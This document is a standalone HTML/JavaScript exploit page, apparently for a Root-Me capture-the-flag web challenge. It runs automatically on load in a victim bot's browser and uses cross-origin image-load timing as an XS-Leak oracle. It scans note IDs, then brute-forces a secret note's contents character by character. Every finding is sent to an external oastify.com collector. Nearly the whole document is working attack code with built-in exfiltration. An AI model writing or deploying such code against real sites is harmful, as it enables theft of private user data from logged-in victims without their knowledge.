<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak Exploit</title>
</head>
<body>
    <div id="status" style="font-family: monospace; color: #0f0; background: #000; padding: 10px;">Initializing...</div>

    <script>
        // ── CONFIG ──────────────────────────────────────────────────────────────
        const BASE_URL   = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
        const EXFIL      = "http://c6jebfw4342upnf3c2zfoga2zt5ktch1.oastify.com/?data=";
        const ALPHABET   = "abcdefghijklmnopqrstuvwxyz0123456789_{}";

        // Timing thresholds – tune these based on what the server actually returns.
        // A "hit" means the server matched your input and did extra work.
        const HIT_MIN_MS = 1800;   // lower bound for a "slow" (match) response
        const HIT_MAX_MS = 4500;   // upper bound (avoids counting timeouts as hits)

        // How many samples to average to reduce jitter
        const SAMPLES    = 3;

        // Parallelism for the ID-scan phase (keep low to avoid rate-limiting)
        const SCAN_BATCH = 5;

        // ── HELPERS ─────────────────────────────────────────────────────────────
        const sleep = ms => new Promise(r => setTimeout(r, ms));
        const log   = msg => {
            console.log(msg);
            document.getElementById("status").innerText = msg;
        };
        const exfil = payload => {
            new Image().src = EXFIL + encodeURIComponent(payload);
            console.log("[EXFIL]", payload);
        };

        /**
         * Measure the network round-trip time for a single URL.
         * Uses an <img> tag so it fires even cross-origin.
         */
        function probe(url) {
            return new Promise(resolve => {
                const img   = new Image();
                const start = performance.now();
                img.onload = img.onerror = () => resolve(performance.now() - start);
                img.src = url + "?_=" + Math.random(); // cache-bust
            });
        }

        /**
         * Average multiple probes to reduce noise.
         */
        async function avgProbe(url, n = SAMPLES, delay = 200) {
            let total = 0;
            for (let i = 0; i < n; i++) {
                total += await probe(url);
                if (i < n - 1) await sleep(delay);
            }
            return total / n;
        }

        /**
         * Returns true if the URL triggers the timing oracle (slow response).
         */
        async function isHit(url) {
            const t = await avgProbe(url, SAMPLES);
            return t > HIT_MIN_MS && t < HIT_MAX_MS;
        }

        // ── PHASE 1: FIND THE NOTE ID ────────────────────────────────────────────
        /**
         * Scan IDs in batches.  We look for the note whose URL responds slowly
         * when we pass an empty/minimal prefix (the note just existing = oracle hit).
         *
         * NOTE: The exact oracle URL format depends on the challenge.
         * Two common patterns — pick the one that matches your challenge:
         *
         *   Pattern A:  /notes/<id>/<prefix>          ← your current approach
         *   Pattern B:  /notes/?id=<id>&search=<prefix>
         *
         * Adjust buildScanUrl() below to match.
         */
        function buildScanUrl(id) {
            // No flag format wrapper — probe the bare note URL.
            // A slow response means this note contains the flag content.
            return BASE_URL + id + "/";
        }

        function buildFlagUrl(id, prefix) {
            return BASE_URL + id + "/" + prefix;
        }

        async function findNoteId(start = 1, end = 4000) {
            exfil("SCAN_START_" + start + "_to_" + end);
            log(`[Phase 1] Scanning IDs ${start}–${end} for flag note...`);

            for (let id = start; id <= end; id += SCAN_BATCH) {
                const batch = [];
                for (let j = 0; j < SCAN_BATCH && id + j <= end; j++) {
                    batch.push(id + j);
                }

                // Run batch in parallel
                const results = await Promise.all(batch.map(async (nid) => {
                    const url = buildScanUrl(nid);
                    const t   = await probe(url);
                    return { nid, t };
                }));

                for (const { nid, t } of results) {
                    log(`[Scan] ID ${nid} → ${t.toFixed(0)}ms`);
                    if (t > HIT_MIN_MS && t < HIT_MAX_MS) {
                        exfil("FOUND_NOTE_ID_" + nid + "_time_" + t.toFixed(0));
                        exfil("NOTE_ID=" + nid);   // clean dedicated ping
                        log(`[Phase 1] ✅ HIT on note ID: ${nid} (${t.toFixed(0)}ms)`);
                        return nid;
                    }
                }

                // Small pause between batches
                await sleep(300);
            }

            exfil("NO_NOTE_ID_FOUND");
            log("[Phase 1] ❌ No note ID found in range.");
            return null;
        }

        // ── PHASE 2: BRUTE-FORCE THE FLAG ───────────────────────────────────────
        async function bruteForceFlag(noteId) {
            let flag = ""; // no flag format — start from scratch
            exfil("BRUTE_START_NOTE_" + noteId);
            log(`[Phase 2] Brute-forcing flag on note ${noteId}, starting from empty prefix...`);

            while (true) {
                let found = false;

                for (const char of ALPHABET) {
                    const candidate = flag + char;
                    const url = buildFlagUrl(noteId, candidate);

                    const t = await avgProbe(url, SAMPLES, 150);
                    log(`[Brute] "${candidate}" → ${t.toFixed(0)}ms`);

                    if (t > HIT_MIN_MS && t < HIT_MAX_MS) {
                        flag = candidate;
                        found = true;
                        exfil("FLAG_PROGRESS_" + flag);
                        log(`[Phase 2] ✅ Char found! Flag so far: "${flag}"`);
                        await sleep(500);
                        break;
                    }
                    await sleep(200);
                }

                if (!found) {
                    // No char matched — flag is complete (or oracle is broken)
                    exfil("FLAG_COMPLETE_" + flag);
                    log(`[Phase 2] 🏁 Flag complete: "${flag}"`);
                    break;
                }

                // No closing brace to detect — loop stops when no char matches
            }
            return flag;
        }

        // ── MAIN ─────────────────────────────────────────────────────────────────
        async function main() {
            exfil("BOT_ARRIVED_OK");
            log("Bot arrived. Starting exploit...");

            // Warm up auth / session
            const win = window.open(BASE_URL, "_blank");
            await sleep(2000);

            // ── OPTION A: Unknown note ID — scan first ──
            const noteId = await findNoteId(1, 4000);
            if (!noteId) return;

            // Small gap before brute-force
            await sleep(1000);

            // ── OPTION B: Override here if you already know the ID ──
            // const noteId = 42;

            const flag = await bruteForceFlag(noteId);
            log("Done: " + flag);
        }

        window.onload = () => setTimeout(main, 800);
    </script>
</body>
</html>
